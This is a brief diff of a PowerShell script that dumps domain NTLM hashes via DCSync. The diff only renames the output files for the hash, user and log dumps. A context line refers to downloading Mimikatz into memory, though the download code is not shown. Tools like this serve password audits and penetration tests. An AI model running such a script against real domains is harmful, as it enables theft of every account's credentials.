@@ -4,10 +4,10 @@
 $DATE = $(get-date -f yyyyMMddThhmm)
 $PATH = "C:\temp\" + $DATE + "_" + "DCSYNC" + "\"
 $EXT = ".txt"
-$LOG = $PATH + $DATE + "_" + "DCSync_NTLM_full" + $EXT
-$HASHES = $PATH + $DATE + "_" + "DCSync_NTLM_Hashes" + $EXT
-$USERS = $PATH + $DATE + "_" + "DCSync_NTLM_Users" + $EXT
-$IMPORTFILE = $PATH + $DATE + "_" + "DCSync_NTLM_UserHash_Import" + $EXT
+$LOG = $PATH + $DATE + "_" + "DCSync_NTLM_full_LOG" + $EXT
+$HASHES = $PATH + $DATE + "_" + "DCSync_NTLM_Hashes_FINAL" + $EXT
+$USERS = $PATH + $DATE + "_" + "DCSync_NTLM_Users_FINAL" + $EXT
+$IMPORTFILE = $PATH + $DATE + "_" + "DCSync_NTLM_UserHash_Import_FINAL" + $EXT
 
 # download mimikatz into memory
 Write-Host "[INFO] Downloading Mimikatz into Memory" -ForegroundColor Gray
